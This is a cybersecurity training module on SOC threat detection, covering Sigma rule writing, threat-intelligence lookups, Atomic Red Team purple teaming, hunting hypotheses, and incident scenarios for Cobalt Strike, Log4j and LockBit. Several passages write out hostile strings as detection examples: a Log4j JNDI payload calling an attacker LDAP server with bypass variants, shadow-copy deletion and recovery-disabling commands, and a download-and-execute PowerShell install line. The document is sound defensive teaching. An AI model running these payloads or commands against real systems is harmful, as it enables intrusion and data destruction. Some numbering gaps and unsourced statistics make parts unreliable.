Module 7: Threat Detection
1. SECTION OVERVIEW

What is Threat Detection? Threat detection is the practice of identifying malicious activity within an organization's environment before damage occurs — or as quickly as possible afterward. It combines signature-based detection (known bad patterns), behavioral detection (anomalies from baseline), and threat intelligence (known attacker infrastructure) to generate alerts that SOC analysts investigate. Effective threat detection requires understanding how attackers operate — their tools, techniques, procedures (TTPs) — and building detection rules that catch them at each stage of the attack lifecycle.

Why It Matters: The global average dwell time (time from compromise to detection) was 277 days in 2025 (IBM). In that time, attackers can exfiltrate terabytes of data, deploy ransomware across thousands of hosts, and establish multiple persistence mechanisms. Earlier detection directly reduces breach cost — containing an incident in days costs $1.2M on average, while containing it in weeks costs $4.5M+. Threat detection is the SOC's primary value proposition: turning raw data into actionable alerts that stop attacks.

Real-World Use Cases: Detecting Cobalt Strike beaconing via JA3 fingerprint matching; identifying Log4j exploitation attempts via WAF logs; catching ransomware encryption via file extension monitoring; finding credential theft via LSASS access detection; discovering data exfiltration via DNS tunneling analysis; spotting living-off-the-land (LOLBins) abuse via process chain analysis.

Skills Gained: Detection rule writing (Sigma, SPL, KQL, EQL); behavioral vs signature-based detection; threat intelligence integration; hunting methodologies; detection engineering lifecycle; false positive analysis and tuning; purple team exercise execution.

Prerequisites: SIEM fundamentals, understanding of common attack types, Windows and Linux system administration, basic scripting.

Learning Objectives: (1) Differentiate between signature-based, behavioral, and anomaly-based detection, (2) Write effective detection rules using Sigma for any SIEM platform, (3) Create a detection coverage heatmap mapped to MITRE ATT&CK, (4) Execute a purple team exercise using Atomic Red Team to validate detection coverage, (5) Apply threat intelligence to detect emerging threats proactively.

2. DETAILED NOTES

Subtopic 1: Detection Methodologies — Signature, Behavioral, and Anomaly

There are three fundamental approaches to threat detection, each with strengths and weaknesses. A mature SOC uses all three in layers — no single methodology catches everything. Understanding when to use each approach is a core detection engineering skill.

1. Signature-Based Detection (Known Bad)
Matches traffic, files, or behavior against known indicators of compromise (IoCs).
- Examples: Malware hash detection (SHA256), YARA rules matching file content, Snort/Suricata rules matching network patterns, IP/Domain blocklists, String matching in process command lines
- Strengths: Fast, low false positive rate for the specific pattern, easy to understand, easy to test
- Weaknesses: Detects only known threats, requires constant updates, fails against variants and zero-days, attacker can change one byte to bypass hash detection
- Real-World Example: A YARA rule detecting the string "LockBit" in a process memory — catches known LockBit ransomware variants. But if the attacker renames the executable and changes the mutex name, the rule misses it.

2. Behavioral Detection (Known Suspicious)
Detects actions that are inherently suspicious regardless of the specific tool or malware variant.
- Examples: Process spawning cmd.exe with network connection (lateral movement), PowerShell executing encoded commands, Service installed from remote location, Volume Shadow Copy deletion, Registry Run key modification
- Strengths: Detects unknown malware and zero-days, hard for attackers to bypass (they need to change their behavior, not just their tools), catches TTPs not just IoCs
- Weaknesses: Higher false positive rate (legitimate software also does suspicious things), requires understanding of normal vs abnormal behavior, more complex to implement
- Real-World Example: A rule detecting "process svchost.exe spawning PowerShell" catches any malware using this technique — regardless of the payload. Even if the attacker uses a brand-new never-before-seen C2 tool, the behavioral rule still fires.

3. Anomaly-Based Detection (Unknown Suspicious)
Establishes a baseline of "normal" and alerts when behavior deviates significantly.
- Examples: User login from unusual geographic location, Server outbound traffic volume 500% above baseline, User accessing systems they've never accessed before, Process running at time of day it never runs
- Strengths: Detects insider threats and account compromise, catches attackers who use legitimate tools (LOLBins), adapts to environment changes
- Weaknesses: Highest false positive rate, requires significant baseline data (30+ days), "normal" constantly changes, difficult to tune, computational intensive
- Real-World Example: A database server that normally sends 100 MB/day outbound suddenly sends 5 GB/day at 3 AM — anomaly detection flags this regardless of what protocol or tool is being used. Could be data exfiltration using encrypted HTTPS that no signature rule could detect.

Detection Type Comparison Matrix:
| Aspect | Signature | Behavioral | Anomaly | |--------|-----------|------------|---------| | Detection Rate (known) | 95%+ | 80-90% | 40-60% | | Detection Rate (unknown) | 0-5% | 60-80% | 40-60% | | False Positive Rate | 5-15% | 15-30% | 30-50% | | Maintenance Effort | High (update constantly) | Medium | Low (after baseline) | | Evasion Difficulty | Easy | Hard | Moderate | | Best For | Known malware, C2 IPs | TTPs, LOLBins | Insider threats, APT |

Subtopic 2: Detection Engineering — Sigma Rules and the Detection Lifecycle

Detection engineering is the practice of designing, implementing, testing, and maintaining detection rules. The Sigma format (created by Florian Roth and Thomas Patzke) has become the industry standard for writing SIEM-agnostic detection rules — write once, convert to any SIEM (Splunk, Elastic, QRadar, ArcSight, etc.). A proper detection engineering lifecycle ensures rules are effective, tested, and maintained.

Sigma Rule Anatomy:
title: Suspicious PowerShell - Encoded Command
id: 1a2b3c4d-5e6f-7890-abcd-ef1234567890
status: experimental
description: Detects PowerShell execution with EncodedCommand parameter which is heavily used by malware
author: SOC Analyst
date: 2026/05/21
tags:
- attack.execution
- attack.t1059.001
logsource:
category: process_creation
product: windows
detection:
selection:
Image|endswith: '\powershell.exe'
CommandLine|contains: '-EncodedCommand'
condition: selection
falsepositives:
- Legitimate administrative scripts using encoded commands
level: high

Sigma Rule Fields Explained:
- title/description: Human-readable explanation of what the rule detects
- id: UUID for tracking, linking to MITRE ATT&CK, and managing rules across deployments
- status: experimental (testing), test (validated), stable (production-ready), deprecated
- tags: MITRE ATT&CK mapping (tactic.technique.subtechnique)
- logsource: What log source is needed (product, category, service)
- detection: The detection logic — selection conditions with field matching, then condition (all/any/1 of them/1 of selection, etc.)
- falsepositives: Expected legitimate scenarios that trigger this rule
- level: Severity (informational, low, medium, high, critical)

Advanced Sigma — Correlation Rules:
Sigma also supports rules that combine multiple conditions:
title: Mimikatz Detection via Process Access
logsource:
category: process_access
product: windows
detection:
selection:
CallTrace|contains: 'C:\Windows\SYSTEM32\ntdll.dll+'
SourceImage|endswith: '\mimikatz.exe'
selection_filter:
SourceImage|endswith: '\svchost.exe'
condition: selection and not selection_filter

Detection Engineering Lifecycle:
1. Research: Study the attack technique. Read MITRE ATT&CK details, analysis reports, malware write-ups. Understand: What exactly does the attacker do? What log events are generated? What does "normal" look like?
2. Design: Write detection logic. Choose detection type (signature, behavioral, anomaly). Define conditions precisely — what field values indicate malicious? What are the false positive sources? Write Sigma rule or SIEM-specific query.
3. Implementation: Deploy the rule in a test environment first. Ensure the log source is available and configured correctly. Convert Sigma to target SIEM format.
4. Validation: Test with known malicious traffic. Use Atomic Red Team or real malware samples. Verify: does the rule fire when expected? Does it NOT fire for normal traffic?
5. Tuning: After 1-2 weeks in production, review all alerts. Calculate FP rate. Add exceptions for known FPs. Adjust thresholds if needed.
6. Deployment: Move rule to production with appropriate severity. Enable alerting. Document in rule catalog.
7. Maintenance: Review rule quarterly. Check if new false positives emerged. Update as attacker TTPs evolve. Retire rules that no longer detect real threats.

Common Detection Engineering Mistakes:
- Overly Broad: Rule matches 90% of legitimate traffic — analyst ignores it within a day
- Overly Specific: Rule matches exact malware filename — attacker renames file, rule misses
- Log Source Not Available: Rule requires Sysmon Event ID 10 (ProcessAccess) but only Windows Event Log is forwarded
- No False Positive Testing: Deploying a rule without testing against normal traffic leads to alert fatigue
- No MITRE Mapping: Without mapping to ATT&CK, you don't know what techniques you cover vs miss

Subtopic 3: Threat Intelligence Integration for Detection

Threat intelligence (CTI) turns raw data into context — telling you which IPs, domains, hashes, and TTPs are associated with known adversaries. Integrating CTI into detection rules dramatically improves detection accuracy. Without CTI, you can detect "a process made an outbound connection" — with CTI, you detect "a process made an outbound connection to a known APT29 C2 infrastructure."

Threat Intelligence Tiers (CERT/CSIRT):
- Strategic: High-level trends, adversary motivations, geopolitical context. For SOC manager and CISO. (Annual reports, industry threat briefs)
- Operational: Adversary TTPs, tools, infrastructure patterns. For detection engineers. (APT reports, malware analysis papers)
- Tactical: Specific IoCs — IPs, domains, hashes, URLs. For SOC analysts. (Blocklists, threat intel feeds)
- Technical: Detailed technical indicators — YARA rules, Sigma rules, Snort rules. For detection engineers and automation.

Integrating Threat Intel into SIEM:
Approach 1 — Static Lookups: Import threat intel feeds as lookup tables in SIEM. Each event is checked against the lookup.
index=proxy [| inputlookup malicious_ips.csv | fields ip as dest_ip ]

Approach 2 — Enrichment at Ingestion: Heavy forwarder or enrichment server checks each IP/hash/domain against threat intel at ingestion time and adds tags.
Example: When a Windows event arrives, check the source IP against 5 threat intel sources. If found in 2+, add tag "threat_intel_positiv' + 'e" to the event. Create rules that look for this tag.

Approach 3 — SOAR Orchestration: When an alert fires, SOAR queries threat intel APIs and adds context to the alert before analyst sees it.
Automation: "Alert has source IP → query AbuseIPDB → query VirusTotal → query GreyNoise → add reputation score to alert → if score > 80, escalate priority"

CTI-Driven Detection — Real Example:
A new Emotet phishing campaign is reported by CISA. IOCs provided:
- Email subject: "Invoice #28472"
- Attachment: "Invoice_28472.docm"
- C2 domain: emotet-c2-2026.example.net
- C2 IP: 185.220.101.5

Detection Actions:
1. Immediate (signed rules): Block C2 IP and domain at firewall and DNS. Add email subject and attachment name to email gateway filter. Add hash to EDR blocklist.
2. Short-term (Sigma rule): Write rule: PowerShell from Office with network connection matching known Emotet behavior patterns.
3. Long-term (behavioral): Create behavioral rule: Office application spawning a child process with network connection = high-fidelity malware indicator.

Threat Hunting with CTI:
Hunt hypothesis: "Are any of our hosts communicating with APT29's known infrastructure?"
index=proxy dest_ip IN (45.33.32.156, 91.200.100.50, 5.188.62.10)
| stats count, sum(bytes) by src_ip, dest_ip
| where count > 5 OR sum(bytes) > 1000000
| table src_ip, dest_ip, count, sum(bytes)

If results found, investigate: Are these scheduled connections (C2 beaconing) or one-time? What process made them? What data was sent?

Subtopic 4: Hunting, Purple Teaming, and Coverage Validation

Detection rules are only useful if they actually work when attacked. Purple teaming is the practice of simulating real adversary behavior in your environment to validate that your detection rules fire correctly. Atomic Red Team (ART) is the most popular tool for this — it executes specific ATT&CK techniques safely and provides a framework for measuring detection coverage.

Purple Team Exercise Methodology:
1. Select Technique: Pick a specific MITRE ATT&CK technique (e.g., T1059.001 — PowerShell Execution).
2. Review Existing Detection: What rules do you have for this technique? What log sources are needed?
3. Execute Simulation: Run the Atomic Red Team test for the technique in a test environment.
4. Observe Detection: Did your SIEM generate an alert? Was it the expected rule? Did the alert have enough context?
5. Measure Coverage: If detected → success. If not → find the gap (missing log? rule not deployed? wrong logic?).
6. Improve: Fix the gap, re-run the test, confirm detection, update documentation.

Atomic Red Team — Installation and Usage:
# Install on Windows VM
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics

# Execute a specific test
Invoke-AtomicTest T1059.001 -TestNumbers 1

# Execute all tests for a technique
Invoke-AtomicTest T1003.001

# Execute all tests for a tactic
Invoke-AtomicTest T1055 -Tactic Execution

# Run tests from a CSV of techniques
Invoke-AtomicTest -InputPath C:\tests\t1003_credential_access.csv

Hunting Methodology — Hypothesis-Driven:
Unlike reactive detection (waiting for alerts), hunting proactively searches for signs of compromise.

Hunting Loop:
1. Hypothesis: "I believe an attacker may be using mshta.exe to execute malicious HTA payloads because I read a report about recent TA551 campaigns."
2. Create Query: index=process_creation Image|endswith="mshta.exe" | where not ParentImage in ("C:\\Program Files\\*", "C:\\Windows\\System32\\*")
3. Analyze Results: Found 3 mshta executions from %TEMP% directory — highly suspicious. Investigate each.
4. Confirm or Refute: One was a legitimate IT tool. Two were malicious — started from Office documents. Hunting success.
5. Create Permanent Detection: Convert hunting query into a permanent rule.

Popular Hunting Hypothesis Examples:
- "Are there DNS queries to domains that look algorithmically generated (DGA)?"
- "Are any service accounts logging in from workstations?"
- "Are there scheduled tasks created by non-admin users?"
- "Are any administrative accounts authenticating from unusual IP ranges?"
- "Are there processes with suspicious parent-child relationships (e.g., Word.exe → PowerShell.exe)?"
- "Is any host making connections to known Cobalt Strike ports (50050, 443, 80) in a beacon pattern?"

3. CONCEPT BOXES
INFO BOX
Living Off the Land (LOLBins): LOLBins are legitimate Microsoft-signed executables that attackers abuse to perform malicious actions while evading detection. Common examples: powershell.exe (script execution), rundll32.exe (execute DLLs), mshta.exe (execute HTA scripts), regsvr32.exe (register COM and DLLs), certutil.exe (download files), bcedit.exe (modify boot configuration), vssadmin.exe (delete shadow copies). Because these files are signed by Microsoft, traditional whitelisting won't block them. Detection must focus on how they're used (unusual parent process, unexpected command-line arguments, execution from abnormal locations).
REMEMBER BOX
You Cannot Detect What You Don't Log. This is the single most important principle in detection engineering. Before writing a detection rule, verify the log source is available and the relevant fields are populated. Common gaps: Sysmon not installed = no process tree, no network connections. PowerShell module logging disabled = no script block logging. Audit Process Creation not enabled = no EID 4688. EDR on servers but not workstations = blind spot on 80% of hosts. Always audit your log coverage before building your detection program.
WARNING BOX
False Positives Are Worse Than Missed Detections. A missed detection means one incident slips through. A high false positive rate means all analysts stop trusting all alerts. When analysts ignore alerts, everything slips through. Studies show that when FP rate exceeds 30%, analyst response accuracy drops by 60%. When FP rate exceeds 50%, analysts effectively stop responding to alerts. Tune ruthlessly. A rule that fires 100 times per day with 95% FPs is not a detection — it's noise. Better to have 10 high-fidelity rules than 1,000 noisy ones.
SOC ANALYST TIP
Master Process Tree Analysis. When investigating any alert, always look at the parent-child process chain. This single technique reveals more about an attack than any other analysis. Example: EmailClient.exe → WINWORD.EXE → cmd.exe → powershell.exe → rundll32.exe. Even without knowing what the final payload is, the process tree tells you: the attack started from email, used a Word document with a macro, spawned a command shell, launched PowerShell, and loaded a DLL. This is a classic phishing → malware execution chain. Every SOC analyst should be able to read a process tree like reading a story.
INTERVIEW Q&A
Q: "What's your process for creating a new detection rule?"
A: "First, I research the technique — read MITRE ATT&CK, any analysis reports, and existing Sigma rules. I identify exactly what happens at the log level: what process events, network events, or file events are generated. Then I determine the best detection approach — is this a signature match (exact IoC) or behavioral (unusual parent/child)? I write the rule in Sigma format so it's portable. I test it with a real sample of the attack using Atomic Red Team — does it fire? Then I test it against normal traffic — does it NOT fire when it shouldn't? I deploy in monitor-only for 2 weeks, tune based on results, and only then enable alerting. Every rule gets documented with MITRE mapping, test evidence, and false positive notes."

Q: "How do you measure if your detection program is effective?"
A: "I use three metrics: (1) Detection coverage — what percentage of MITRE ATT&CK techniques have detection rules? Tracked via a coverage heatmap updated after each purple team exercise. (2) Detection rate — in our last purple team, what percentage of simulated attacks were detected by automated rules vs required human hunting? Target: 70%+ detection by rules. (3) True positive rate — of all alerts generated, what percentage are actual threats? Target: >50%. If coverage is low, we need more rules. If detection rate is low, our rules don't work. If TP rate is low, our rules are noisy and need tuning."

Q: "What's the most effective detection rule you've ever written?"
A: "A rule detecting Office applications spawning child processes with network connections. It catches phishing-based malware execution regardless of the specific malware family. The rule is simple: ParentImage ends with 'WINWORD.EXE' OR 'EXCEL.EXE' OR 'OUTLOOK.EXE' AND ChildImage is 'powershell.exe' OR 'cmd.exe' OR 'wscript.exe' OR 'cscript.exe' OR 'regsvr32.exe' AND process has network connection within 60 seconds. This rule has detected Emotet, TrickBot, Dridex, Qbot, IcedID, and dozens of other malware families — all without updating a single signature. False positive rate is under 5% because legitimate Office rarely spawns command-line tools with network access."

10. HANDS-ON LABS

Beginner Lab: Sigma Rule Writing and Conversion

Objective: Write 5 Sigma detection rules for common attack techniques, convert them to Splunk/Elastic format, and test them against sample EVTX files.

Setup: Python with sigma-cli installed (pip install sigma-cli). Download sample EVTX files from sbousseaden's EVTX-ATTACK-SAMPLES repo. Have a text editor ready.

Step-by-Step:
1. Write a Sigma rule to detect RunDLL32 executing JavaScript:
title: RunDLL32.exe Executes JavaScript
logsource: category: process_creation, product: windows
detection: selection: Image|endswith: '\rundll32.exe', CommandLine|contains: 'javascript:'
condition: selection
level: high
2. Write a Sigma rule to detect certutil downloading files:
title: Certutil URL Download
logsource: category: process_creation, product: windows
detection: selection: Image|endswith: '\certutil.exe', CommandLine|contains: '-urlcache'
condition: selection
level: medium
3. Convert Sigma to Splunk: sigma convert -t splunk -p default rule.yml
4. Convert Sigma to Elastic: sigma convert -t elasticsearch -p default rule.yml
5. Test against EVTX sample: Load the EVTX file in Splunk or Elastic, run the converted query, verify results
6. Create rules for: (3) WMI persistence, (4) PowerShell encoded command, (5) Scheduled task creation by non-admin

Expected Results: You can write, convert, and test Sigma rules. You understand the syntax, logsource categories, detection conditions, and field modifiers (|endswith, |contains, |startswith).

Troubleshooting: Conversion fails? Check Python version and sigma version. Field names differ between SIEMs — check the Sigma documentation for field mapping.

Detection Opportunities: Write rules for techniques you encounter in your daily work. Test them against real SIEM data (with proper authorization).

11. SOC SCENARIOS

Scenario 1: Cobalt Strike C2 Detection via Process Injection

What Happened: EDR generates an alert on a finance workstation: "Process injection detected — unknown DLL injected into svchost.exe." The injected process then makes outbound HTTPS connections to 45.33.32.156:443. This matches Cobalt Strike C2 behavior — beaconing to an external IP via HTTPS, using a legitimate system process as a host.

How to Detect: Sysmon Event ID 8 (CreateRemoteThread) — detects one process creating a thread in another process. Sysmon Event ID 7 (ImageLoad) — detects a DLL loaded into a process from an abnormal location (e.g., DLL loaded into svchost.exe from %TEMP%). Correlation: process injection (EID 8) followed by network connection (EID 3) from the injected process to external IP = high-fidelity Cobalt Strike indicator.

Sigma Rule:
title: Cobalt Strike — Process Injection into svchost.exe
logsource: product: windows, category: create_remote_thread
detection: selection: TargetImage|endswith: '\svchost.exe', SourceImage|endswith: '\svchost.exe'
condition: selection
falsepositives: Legitimate antivirus injections, Microsoft update processes
level: critical

How to Investigate: Identify the source process that performed the injection — what process injected the DLL? Check its parent chain — is it Office/PDF/email-related? Extract the injected DLL from svchost.exe's memory for analysis. Check the C2 IP (45.33.32.156) — is it on any threat intel blocklists? Check JA3 hash of the TLS connection — Cobalt Strike has distinctive JA3 fingerprints. Check what other hosts communicated with the same IP — is this isolated or widespread?

How to Respond:
1. Immediately isolate the affected workstation
2. Block C2 IP and any associated domains at firewall and proxy
3. Capture memory image before remediation (Cobalt Strike injects into memory, not disk)
4. Check for lateral movement — Cobalt Strike can spread to other hosts via SMB or WMI
5. Check if any data was exfiltrated via the C2 channel
6. Search all hosts for connections to the same C2 IP — use DNS and proxy logs
7. Reimage the affected host from clean backup

How to Document: Incident report with: injection technique, C2 infrastructure, JA3 fingerprint, timeframe, data exfiltrated assessment, affected hosts, remediation steps. Update detection rules based on findings.

Scenario 2: Log4j (CVE-2021-44228) Exploitation Attempt

What Happened: WAF alerts on an HTTP request containing the string ${jndi:ldap://45.33.32.156:1389/a} in the User-Agent header. This is a Log4j exploitation attempt — the attacker is trying to trigger a JNDI lookup to an attacker-controlled LDAP server that will serve a malicious Java class.

How to Detect: WAF rules detecting JNDI lookup patterns in any HTTP header, parameter, or body. Multiple detection patterns: ${jndi:ldap://, ${jndi:rmi://, ${jndi:dns://, ${${::-j}ndi: (bypass attempts using lowercase/uppercase tricks). Also detect outbound LDAP connections to non-standard ports (1389, 389) from web servers.

SIEM Detection Query:
index=proxy OR index=waf
| search "*\${jndi:*" OR "*jndi:ldap*" OR "*jndi:rmi*" OR "*jndi:dns*"
| stats count by src_ip, dest_ip, uri, http_user_agent
| where count > 1
| table src_ip, dest_ip, uri, http_user_agent, count

How to Investigate: Check if the Log4j version on the target server is vulnerable. Check if the JNDI lookup succeeded (check DNS logs for outbound queries to attacker domain). Check for file creation after the exploit attempt (web shell, backdoor). Check the attacker's LDAP server IP — what else is hosted there? Check if the attacker attempted other techniques (lateral movement, data access).

How to Respond:
1. If exploitation is confirmed: isolate the affected server immediately
2. Block the attacker IP and LDAP server IP at firewall
3. Apply Log4j patch (upgrade to 2.17.0+) or implement mitigation (set log4j2.formatMsgNoLookups=true)
4. Scan all servers for vulnerable Log4j versions
5. Check for post-exploitation activities (web shells, new accounts, unusual processes)
6. Implement WAF rules blocking JNDI patterns across all web applications

How to Document: Vulnerability exploitation incident. Note: CVE-2021-44228, affected systems, patch status, detection and blocking timeline, scope assessment, IoCs.

Scenario 3: Ransomware — LockBit 3.0 Detection and Response

What Happened: EDR alerts: "Mass file encryption detected on SERVER23." Sysmon Event ID 11 shows thousands of file creations with .lockbit extension within 30 seconds. Event ID 1 shows vssadmin.exe executed with "delete shadows /all /quiet." Event ID 4688 shows bcdedit.exe executed with "/set {default} recoveryenabled no." This is the LockBit 3.0 ransomware pattern: encrypt files, delete backups, disable recovery.

How to Detect: Behavioral detection rules capturing the ransomware sequence pattern. Key Sigma rule: shadow copy deletion + file encryption + recovery disable in < 60 seconds on same host. File extension monitoring for known ransomware extensions (.lockbit, .encrypted, .enc, .crypted). Process chain detection: parent process (cmd.exe or explorer.exe) spawning vssadmin.exe = highly suspicious.

Sigma Rule for Ransomware Detection:
title: LockBit 3.0 — Shadow Copy Deletion
logsource: product: windows, category: process_creation
detection: selection: Image|endswith: '\vssadmin.exe', CommandLine|contains|all: 'delete', 'shadows'
condition: selection
level: critical

How to Investigate: Find patient zero — which host was compromised first? The ransomware likely spread from another host via SMB/WMI. Check domain controller logs for lateral movement. Determine initial access vector — check email for phishing, check RDP logs for external connections, check vulnerability scans for unpatched services. Check if there's a ransom note — what Bitcoin address is used? Check if data was exfiltrated before encryption (LockBit often steals data before encrypting — "double extortion").

How to Respond:
1. Isolate SERVER23 and all hosts showing encryption activity
2. Block SMB (port 445) at all switches/firewalls to prevent spread
3. Shut down all mapped drives immediately
4. Check offline/immutable backup — if available, validate backup integrity
5. Do NOT pay ransom — only 54% of victims get data back, and paying funds criminal operations
6. Report to law enforcement (FBI IC3, CISA)
7. Wait for decryption tools — law enforcement sometimes obtains decryption keys
8. Begin forensic investigation: capture memory and disk before reimage

How to Document: Major incident report with: ransomware family (LockBit 3.0), encryption scope (files/hosts), backup status, ransom note, Bitcoin wallet address, timeline, containment actions, recovery actions, lessons learned. Recommend: implement offline backups, enable EDR blocking for ransomware behaviors, restrict vssadmin.exe and bcdedit.exe execution via AppLocker.

2. You need to detect an attacker running Mimikatz to dump credentials from LSASS. Which Sysmon Event ID would be most useful and what field would you check?

3. Your SIEM has 5,000 alerts per day from a rule titled "Suspicious PowerShell." Analysts report 90% are false positives from IT automation scripts. Describe your tuning process.
Answer: (1) Analyze 100 FP alerts — identify common patterns (specific IT tool names, specific users, specific arguments like -NoProfile, specific parent processes), (2) Add exceptions to the rule: exclude processes with parent process matching IT automation tools, exclude specific user accounts, exclude arguments matching known safe script names, (3) Implement allowlist of known safe PowerShell scripts by hash, (4) Adjust severity from medium to low for generic PowerShell alerts and create specific rules for high-risk patterns (PowerShell with -EncodedCommand, PowerShell downloading from URL, PowerShell accessing LSASS), (5) After changes, monitor FP rate for 1 week — target reduction from 90% to 50%, then iterate. 5. Explain how you would detect DNS tunneling data exfiltration using only DNS logs.
Answer: DNS tunneling encodes data in subdomain labels and sends it via DNS queries. Detection methods: (1) High query volume — a single host making 10,000+ DNS queries per hour to the same domain, (2) Long subdomain labels — legitimate subdomains average 10-20 characters; DNS tunneling uses 40+ characters per label, (3) Unusual record types — TXT records are most common for tunneling (data can be 255 bytes per record), (4) Entropy analysis — DNS tunneling subdomains have high entropy (random character distribution) compared to legitimate subdomains, (5) Domain age — tunneling domains are often newly registered (< 30 days), (6) Query frequency — DNS tunneling often uses specific intervals (every 1-5 seconds) without breaks, (7) Low TTL — tunneling domains often set low TTL (60-300 seconds) to facilitate rapid configuration changes. KQL query: DnsEvents | where SubdomainLength > 40 | where QueryCount > 1000 per hour | sort by EntropyScore desc

Scenario A — Rule that Never Fires: You discover that one of your critical detection rules ("Suspicious Service Installation — Remote") has never generated an alert in 6 months. This rule is supposed to detect attackers installing services remotely. Should you be concerned?
Answer: Yes, this is extremely concerning. Either (1) no attacker has used this technique against you (unlikely in 6 months if you have any exposure), or (2) the rule doesn't work. Investigate: (a) Check the log source the rule depends on — is the Windows Event Log for service creation (Event ID 7045, 4697) being forwarded to SIEM? (b) Test the rule manually — run Invoke-AtomicTest T1543.003 (Create or Modify System Process: Windows Service) — does the alert fire? (c) Check if the rule was accidentally disabled, (d) Check if the log source stopped sending data months ago, (e) Check if the rule logic has an error — maybe the field name changed after an SIEM update. After fixing, always test with Atomic Red Team before declaring the rule operational.

Scenario B — Alert Overwhelm: A new detection rule was deployed 2 weeks ago. It generated 12,000 alerts in the first week and 15,000 in the second week. Analysts classified 200 of those alerts — only 3 were true positives. The remaining 26,800 alerts were never investigated because analysts stopped looking at them. What do you do?
Answer: This is a critical noise problem. (1) Immediately disable the rule — it's doing more harm than good by creating alert fatigue, (2) Analyze the 200 classified alerts — find the FP pattern. Likely causes: rule is too broad (matches too much normal behavior), missing exception list, threshold too low, (3) Redesign the rule: add more specific conditions (e.g., instead of "any PowerShell", require "PowerShell WITH -EncodedCommand AND parent process is Office application"), (4) Add exception list for known safe sources (specific IT teams, automation tools, patch management systems), (5) Re-deploy in monitor-only mode for 1 week — review all generated alerts, (6) Only enable alerting when FP rate drops below 20%, (7) In the future: always deploy new rules in monitor-only for 2 weeks before enabling alerting. Use a staging process: monitor-only → low severity → medium severity → high severity as confidence grows.

Interview Questions

1. "How would you detect process hollowing, and what log events would you look for?"
Answer: "Process hollowing occurs when a malicious process creates a legitimate process in a suspended state, unmaps the legitimate code, injects malicious code into the process space, and resumes the thread. Detection log events: (1) Sysmon Event ID 8 (CreateRemoteThread) — a process creating a thread in another process indicates injection, (2) Sysmon Event ID 1 — process creation with CREATE_SUSPENDED flag (not directly visible, but unusual parent-child relationships), (3) Sysmon Event ID 7 (ImageLoad) — DLL loaded from unusual path into a system process, (4) Sysmon Event ID 10 (ProcessAccess) — handle opened to a process with PROCESS_CREATE_THREAD and PROCESS_VM_WRITE access, (5) Windows ETW events from Microsoft-Windows-Kernel-Process. Key behavioral pattern: a process (often explorer.exe or svchost.exe) that was created and then suddenly starts making network connections or accessing files in abnormal ways. Also look for: a legitimate process (notepad.exe, svchost.exe) running from abnormal location (C:\Users\Public instead of C:\Windows\System32)."

2. "What's the difference between a YARA rule and a Sigma rule? When would you use each?"
Answer: "YARA rules are for identifying malware through file and memory content patterns — byte sequences, strings, file metadata. They're used for: malware classification, memory forensics, file triage. Example: a YARA rule detecting the unique XOR key pattern used by LockBit ransomware. Sigma rules are for identifying adversary behavior through log events — process creation, network connections, registry changes. They're used for: SIEM alerting, detection engineering, threat hunting. Example: a Sigma rule detecting vssadmin.exe with 'delete shadows' parameter. You use YARA when you have a file or memory sample and want to identify it. You use Sigma when you have logs and want to detect behavior. They're complementary — YARA identifies the 'what' (the malware family), Sigma identifies the 'how' (the attacker behavior pattern)."

3. "How do you prioritize which detection rules to create first when building a new SOC?"
Answer: "I prioritize by risk: (1) First, techniques that cause immediate business impact if exploited — ransomware (T1486), data exfiltration (T1048), credential theft (T1003) — these have the highest cost if missed. (2) Second, techniques with the shortest attacker dwell time — initial access techniques like phishing (T1566) and exploitation of public-facing apps (T1190). (3) Third, techniques that high-probability threats use — check threat intel for the most common techniques targeting your industry. (4) Fourth, techniques that are easiest to detect with available data — if you already have Sysmon deployed, prioritize rules that use Sysmon data over rules requiring new log sources. (5) Use MITRE ATT&CK prioritization: focus on techniques in the top ATT&CK navigator layers (Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Lateral Movement). Build a minimum viable detection set covering the 'common 20' techniques first, then expand coverage over time."
